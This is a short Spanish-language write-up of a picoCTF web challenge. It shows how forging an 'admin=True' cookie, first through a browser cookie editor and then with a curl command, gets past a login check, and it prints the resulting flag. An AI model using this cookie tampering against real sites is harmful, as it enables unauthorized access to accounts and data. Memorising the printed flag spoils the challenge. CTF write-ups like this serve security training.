## Solucion
Para este problema nos dicen que al entrar a la pagina intentemos logearnos con el usuario Joe
![[Pasted image 20231002104009.png]]
Para despues mostrarnos que no podemos entrar con este ya que al revisar la contraseña no coincide
![[Pasted image 20231002104023.png]]
Pero al intentar entrar con otro usuario podemos entrar ya que no esta haciendo la verificacion de la contraseña
![[Pasted image 20231002104042.png]]
Para poder llegar a la bandera necesitamos que tener los privilegios de Joe pero entrando de otra cuenta, para eso vamos a utilizar las Cookies, asi que descargamos cookie editor para poder modificar los permisos
![[Pasted image 20231002104311.png]]
Una ves en logeados nos otorgamos los privilegios de admin para poder ver la bandera
![[Pasted image 20231002104654.png]]
y listo:
![[Pasted image 20231002104601.png]]

tambien podemos usar la consola, cambiando de forma manual las cookies con un curl

	┌──(kali㉿kali)-[~]
	└─$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: admin=True" | grep pico
	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
	                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0    149      0  0:00:08  0:00:08 --:--:--   273
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
            